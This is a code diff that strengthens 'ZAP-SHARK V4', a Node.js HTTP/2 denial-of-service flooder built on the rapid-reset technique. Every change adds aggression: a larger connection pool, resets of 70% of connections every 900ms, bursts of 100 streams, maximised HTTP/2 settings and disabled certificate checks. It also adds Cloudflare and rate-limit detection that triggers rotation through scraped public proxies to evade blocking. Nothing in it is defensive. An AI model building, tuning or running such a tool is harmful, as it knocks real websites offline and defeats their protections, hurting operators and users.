@@ -17,43 +17,40 @@ class ZAPSHARK_V4 {
         this.wifiConnected = true;
         
         // PROXY SYSTEM
-        this.proxyApi = 'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all';
+        this.proxyApi = 'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all';
         this.currentProxy = null;
         this.proxyList = [];
         this.proxyIndex = 0;
         this.proxyStartTime = Date.now();
-        this.lastProxyRotate = Date.now();
         this.proxyRotationInterval = 600000; // 10 minutes
-        this.proxyRetryInterval = 600000; // 10 minutes if no proxy
+        this.cfDetected = false;
+        this.lastCfDetection = 0;
         
-        // CONNECTION SYSTEM
+        // CONNECTION SYSTEM - ULTRA AGGRESSIVE
         this.connectionPool = [];
         this.activeStreams = 0;
-        this.poolSize = 20; // DOUBLE AGGRESSION
+        this.poolSize = 30; // MASSIVE POOL
         this.maxStreamsPerConn = 1000;
         this.lastConnectionReset = Date.now();
-        this.connectionResetInterval = 500; // RESET EVERY 0.5s
+        this.connectionResetInterval = 900; // RAPID RESET = 900ms
         
         // RESPONSE TRACKING
         this.lastResponseCode = 0;
         this.responseCodeCounts = {};
-        this.lastCodeUpdate = Date.now();
-        
-        // CONNECTION CHECK
-        this.initialConnectionMade = false;
-        this.connectionCheckDone = false;
+        this.cfCount = 0;
+        this.rateLimitCount = 0;
         
         // MAINTENANCE
         this.lastMaintenance = Date.now();
         this.maintenanceInterval = 3600000;
-        this.maintenanceDuration = 600000;
         
         // INTERVALS
         this.attackInterval = null;
         this.displayInterval = null;
+        this.autoRotateInterval = null;
     }
 
-    // === INITIAL CONNECTION CHECK ===
+    // === INITIAL CONNECTION ===
     async checkInitialConnection() {
         return new Promise((resolve) => {
             const testClient = http2.connect(this.targetUrl);
@@ -61,12 +58,11 @@ class ZAPSHARK_V4 {
                 console.log('ZAP-SHARK | CONNECTED TO HOST');
                 testClient.destroy();
                 setTimeout(() => {
-                    process.stdout.write('\x1B[2J\x1B[0f'); // Clear terminal after 10s
+                    process.stdout.write('\x1B[2J\x1B[0f');
                     resolve(true);
                 }, 10000);
             });
             testClient.on('error', () => {
-                console.log('ZAP-SHARK | CONNECTION FAILED');
                 testClient.destroy();
                 resolve(false);
             });
@@ -88,86 +84,86 @@ class ZAPSHARK_V4 {
             }).on('error', () => {
                 console.log('[-] Failed to fetch proxies');
                 resolve(false);
-            }).setTimeout(10000);
+            }).setTimeout(5000);
         });
     }
 
-    getNextProxy() {
+    async rotateProxy() {
         if (this.proxyList.length === 0) {
-            return null;
+            const fetched = await this.fetchProxies();
+            if (!fetched) return false;
         }
         
         this.proxyIndex = (this.proxyIndex + 1) % this.proxyList.length;
-        return this.proxyList[this.proxyIndex];
+        this.currentProxy = this.proxyList[this.proxyIndex];
+        this.proxyStartTime = Date.now();
+        this.cfDetected = false;
+        this.cfCount = 0;
+        return true;
     }
 
-    async rotateProxy() {
-        const now = Date.now();
-        if (now - this.lastProxyRotate >= this.proxyRotationInterval) {
-            const newProxy = this.getNextProxy();
-            if (newProxy) {
-                this.currentProxy = newProxy;
-                this.proxyStartTime = now;
-                this.lastProxyRotate = now;
-                return true;
-            } else {
-                // No proxy available, retry in 10 mins
-                setTimeout(() => this.rotateProxy(), this.proxyRetryInterval);
-                return false;
-            }
-        }
-        return false;
-    }
-
-    // === CONNECTION SYSTEM ===
+    // === ULTRA AGGRESSIVE CONNECTION SYSTEM ===
     setupConnections() {
-        // DESTROY ALL OLD
+        // DESTROY ALL
         this.connectionPool.forEach(c => { try { c.destroy(); } catch (e) {} });
         this.connectionPool = [];
         
-        // CREATE NEW POOL
+        // CREATE MASSIVE POOL
         for (let i = 0; i < this.poolSize; i++) {
-            setTimeout(() => {
-                try {
-                    const client = http2.connect(this.targetUrl, {
-                        maxSessionMemory: 131072, // DOUBLE MEMORY
-                        maxDeflateDynamicTableSize: 4294967295,
-                        peerMaxConcurrentStreams: 2000
-                    });
-                    
-                    client.setMaxListeners(2000);
-                    
-                    client.settings({
-                        enablePush: false,
-                        initialWindowSize: 16777215,
-                        maxConcurrentStreams: 2000
-                    });
-                    
-                    client.on('error', () => {});
-                    
-                    this.connectionPool.push(client);
-                } catch (err) {}
-            }, i * 10); // FASTER CONNECTION ESTABLISHMENT
+            try {
+                const client = http2.connect(this.targetUrl, {
+                    maxSessionMemory: 262144, // 256KB
+                    maxDeflateDynamicTableSize: 4294967295,
+                    peerMaxConcurrentStreams: 2000,
+                    createConnection: () => {
+                        // AGGRESSIVE SOCKET SETTINGS
+                        const socket = require('tls').connect({
+                            host: this.hostname,
+                            port: 443,
+                            servername: this.hostname,
+                            rejectUnauthorized: false,
+                            ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256'
+                        });
+                        return socket;
+                    }
+                });
+                
+                client.setMaxListeners(5000);
+                
+                // MAXIMUM H2 SETTINGS
+                client.settings({
+                    enablePush: false,
+                    initialWindowSize: 2147483647, // MAX INT
+                    maxConcurrentStreams: 2147483647,
+                    maxFrameSize: 16777215,
+                    maxHeaderListSize: 4294967295
+                });
+                
+                client.on('error', () => {});
+                
+                this.connectionPool.push(client);
+            } catch (err) {}
         }
     }
 
-    // === AGGRESSIVE RAPID RESET ===
+    // === RAPID RESET = 900ms ===
     resetConnections() {
         const now = Date.now();
         if (now - this.lastConnectionReset >= this.connectionResetInterval) {
-            // RESET 50% OF CONNECTIONS EVERY 0.5s
-            const resetCount = Math.ceil(this.connectionPool.length * 0.5);
+            // RESET 70% OF CONNECTIONS EVERY 900ms
+            const resetCount = Math.ceil(this.connectionPool.length * 0.7);
             
             for (let i = 0; i < resetCount; i++) {
                 const index = Math.floor(Math.random() * this.connectionPool.length);
                 if (this.connectionPool[index]) {
                     try {
                         this.connectionPool[index].destroy();
-                        // CREATE NEW CONNECTION IMMEDIATELY
+                        
+                        // IMMEDIATE REPLACEMENT
                         const newClient = http2.connect(this.targetUrl, {
-                            maxSessionMemory: 131072
+                            maxSessionMemory: 262144
                         });
-                        newClient.setMaxListeners(2000);
+                        newClient.setMaxListeners(5000);
                         newClient.on('error', () => {});
                         this.connectionPool[index] = newClient;
                     } catch (err) {}
@@ -178,17 +174,17 @@ class ZAPSHARK_V4 {
         }
     }
 
-    // === MAX AGGRESSION REQUEST ===
+    // === MAXIMUM AGGRESSION REQUEST ===
     sendRequest() {
         if (!this.wifiConnected || this.connectionPool.length === 0) return;
         
         // RAPID RESET
         this.resetConnections();
         
-        // CALCULATE MAX STREAMS (AGGRESSIVE)
+        // MASSIVE STREAM BURST
         const maxStreams = this.maxStreamsPerConn * this.connectionPool.length;
         const availableStreams = maxStreams - this.activeStreams;
-        const streamsThisTick = Math.min(availableStreams, 50); // 50 STREAMS PER TICK
+        const streamsThisTick = Math.min(availableStreams, 100); // 100 STREAMS PER TICK
         
         for (let i = 0; i < streamsThisTick; i++) {
             const client = this.connectionPool[Math.floor(Math.random() * this.connectionPool.length)];
@@ -199,10 +195,12 @@ class ZAPSHARK_V4 {
                 
                 const req = client.request({
                     ':method': 'GET',
-                    ':path': '/?' + Date.now() + Math.random().toString(36).substr(2, 5),
+                    ':path': '/?' + Date.now() + Math.random().toString(36).substr(2, 8),
                     ':authority': this.hostname,
                     'user-agent': 'Mozilla/5.0',
-                    'accept': '*/*'
+                    'accept': '*/*',
+                    'accept-encoding': 'gzip, deflate, br',
+                    'cache-control': 'no-cache'
                 });
                 
                 req.on('response', (headers) => {
@@ -210,9 +208,23 @@ class ZAPSHARK_V4 {
                     this.lastResponseCode = code;
                     this.responseCodeCounts[code] = (this.responseCodeCounts[code] || 0) + 1;
                     
-                    // COUNT RATE LIMITS FOR PROXY ROTATION
-                    if (code === 429 || code === 403 || code === 503) {
-                        setTimeout(() => this.rotateProxy(), 1000);
+                    // CLOUDFLARE DETECTION
+                    if (code === 403 || code === 503 || 
+                        headers['server'] === 'cloudflare' ||
+                        headers['cf-ray']) {
+                        this.cfCount++;
+                        if (this.cfCount > 5) {
+                            this.cfDetected = true;
+                            this.lastCfDetection = Date.now();
+                        }
+                    }
+                    
+                    // RATE LIMIT DETECTION
+                    if (code === 429) {
+                        this.rateLimitCount++;
+                        if (this.rateLimitCount > 3) {
+                            this.rotateProxy();
+                        }
                     }
                 });
                 
@@ -234,7 +246,22 @@ class ZAPSHARK_V4 {
         }
     }
 
-    // === RPS CALCULATION ===
+    // === AUTO PROXY ROTATION ===
+    checkProxyRotation() {
+        const now = Date.now();
+        
+        // AUTO ROTATE EVERY 10 MINUTES
+        if (now - this.proxyStartTime >= this.proxyRotationInterval) {
+            this.rotateProxy();
+        }
+        
+        // IMMEDIATE ROTATION ON CF/429
+        if (this.cfDetected && now - this.lastCfDetection < 5000) {
+            this.rotateProxy();
+        }
+    }
+
+    // === STATS ===
     calculateRPS() {
         const now = Date.now();
         const timeDiff = (now - this.lastRpsCalc) / 1000;
@@ -276,14 +303,14 @@ class ZAPSHARK_V4 {
         const timeUsed = now - this.proxyStartTime;
         const timeLeft = this.proxyRotationInterval - timeUsed;
         
-        if (timeLeft <= 0) return "CHANGING...";
+        if (timeLeft <= 0) return "ROTATING...";
         
         const minutes = Math.floor(timeLeft / 60000);
         const seconds = Math.floor((timeLeft % 60000) / 1000);
         return `${minutes}m ${seconds}s`;
     }
 
-    // === NEW LOGGING SYSTEM ===
+    // === LOGGING ===
     updateDisplay() {
         this.calculateRPS();
         
@@ -303,53 +330,34 @@ class ZAPSHARK_V4 {
         const liveResponseCode = this.getMostCommonResponseCode();
         const proxyDisplay = this.currentProxy ? 
             this.currentProxy.split(':')[0] + ':****' : 
-            'FETCHING...';
+            'DIRECT';
+        
+        const cfStatus = this.cfDetected ? ' | CF: YES' : '';
+        const rateLimitStatus = this.rateLimitCount > 0 ? ` | 429: ${this.rateLimitCount}` : '';
         
         // CLEAR AND OVERWRITE
         process.stdout.write('\x1B[2J\x1B[0f');
         console.log(`ZAP-SHARK — (${runtimeStr}) | SAM: ${localTime}`);
         console.log('=================================');
         console.log(`SHARK-TRS — ${this.totalRequests}`);
-        console.log(`SHARK-LHC — ${liveResponseCode}`);
+        console.log(`SHARK-LHC — ${liveResponseCode}${cfStatus}${rateLimitStatus}`);
         console.log('=================================');
         console.log(`ZAP-SHARK | ${proxyDisplay} | ${this.getTimeUntilMaintenance()}`);
         
-        // SHOW CURRENT RPS INLINE
-        process.stdout.write(`\n[RPS: ${this.currentRPS.toFixed(1)} | CONNS: ${this.connectionPool.length} | STREAMS: ${this.activeStreams}]`);
-    }
-
-    // === MAINTAINCE ===
-    checkMaintenance() {
-        const now = Date.now();
-        if (now - this.lastMaintenance >= this.maintenanceInterval) {
-            this.status = "PAUSED";
-            console.log('\n[!] MAINTENANCE STARTED - PAUSING FOR 10 MINUTES [!]');
-            
-            // FLUSH DNS
-            exec('ipconfig /flushdns >nul 2>&1 || true', () => {});
-            
-            // DESTROY CONNECTIONS
-            this.connectionPool.forEach(c => { try { c.destroy(); } catch (e) {} });
-            this.connectionPool = [];
-            
-            setTimeout(() => {
-                this.status = "ATTACKING";
-                this.lastMaintenance = Date.now();
-                this.setupConnections();
-                console.log('\n[+] MAINTENANCE COMPLETE - RESUMING ATTACK');
-            }, this.maintenanceDuration);
-        }
+        // REAL-TIME STATS
+        process.stdout.write(`\n[RPS: ${this.currentRPS.toFixed(1)} | POOL: ${this.connectionPool.length}/${this.poolSize} | ACTIVE: ${this.activeStreams}]`);
     }
 
     // === MAIN ===
     async start() {
-        console.log('=== ZAP-SHARK V4 - PROXY AGGRESSION ===');
+        console.log('=== ZAP-SHARK V4 - RAPID RESET = 900 ===');
         console.log('Target:', this.targetUrl);
-        console.log('='.repeat(50));
+        console.log('Rapid Reset: 900ms | Proxy Rotation: 10min | Auto-CF/429');
+        console.log('='.repeat(60));
         
-        // INITIAL CONNECTION CHECK
-        this.initialConnectionMade = await this.checkInitialConnection();
-        if (!this.initialConnectionMade) {
+        // INITIAL CONNECTION
+        const connected = await this.checkInitialConnection();
+        if (!connected) {
             console.log('Failed to connect to target');
             process.exit(1);
         }
@@ -358,55 +366,43 @@ class ZAPSHARK_V4 {
         await this.fetchProxies();
         if (this.proxyList.length > 0) {
             this.currentProxy = this.proxyList[0];
-            this.proxyStartTime = Date.now();
         }
         
-        // SETUP CONNECTIONS
+        // SETUP AGGRESSIVE CONNECTIONS
         this.setupConnections();
         
-        // START ATTACK
+        // START SYSTEMS
         setTimeout(() => {
-            // MAIN ATTACK LOOP (ULTRA AGGRESSIVE)
+            // ULTRA AGGRESSIVE ATTACK (20 BATCHES PER TICK)
             this.attackInterval = setInterval(() => {
                 if (this.status === "ATTACKING") {
-                    // SEND 10 BATCHES PER TICK
-                    for (let i = 0; i < 10; i++) {
+                    for (let i = 0; i < 20; i++) {
                         this.sendRequest();
                     }
                 }
-            }, 0.05); // 20ms INTERVAL
+            }, 0.02); // 50ms INTERVAL
             
             // DISPLAY UPDATE
             this.displayInterval = setInterval(() => {
                 this.updateDisplay();
-            }, 100); // UPDATE 10x PER SECOND
+            }, 90); // UPDATE EVERY 90ms
             
             // PROXY ROTATION CHECK
-            setInterval(() => {
-                this.rotateProxy();
-            }, 30000); // CHECK EVERY 30s
+            this.autoRotateInterval = setInterval(() => {
+                this.checkProxyRotation();
+            }, 1000); // CHECK EVERY SECOND
             
-            // MAINTENANCE CHECK
+            // MAINTENANCE
             setInterval(() => {
-                this.checkMaintenance();
-            }, 10000);
-            
-            // WIFI CHECK
-            setInterval(() => {
-                const interfaces = os.networkInterfaces();
-                this.wifiConnected = false;
-                for (const iface in interfaces) {
-                    for (const config of interfaces[iface]) {
-                        if (!config.internal && config.family === 'IPv4' && config.address !== '127.0.0.1') {
-                            this.wifiConnected = true;
-                            break;
-                        }
-                    }
-                }
-                if (!this.wifiConnected) {
+                const now = Date.now();
+                if (now - this.lastMaintenance >= this.maintenanceInterval) {
                     this.status = "PAUSED";
+                    setTimeout(() => {
+                        this.status = "ATTACKING";
+                        this.lastMaintenance = Date.now();
+                    }, 600000);
                 }
-            }, 2000);
+            }, 30000);
             
         }, 1000);
         
@@ -414,6 +410,7 @@ class ZAPSHARK_V4 {
             this.running = false;
             clearInterval(this.attackInterval);
             clearInterval(this.displayInterval);
+            clearInterval(this.autoRotateInterval);
             console.log('\n=== ZAP-SHARK V4 STOPPED ===');
             process.exit(0);
         });
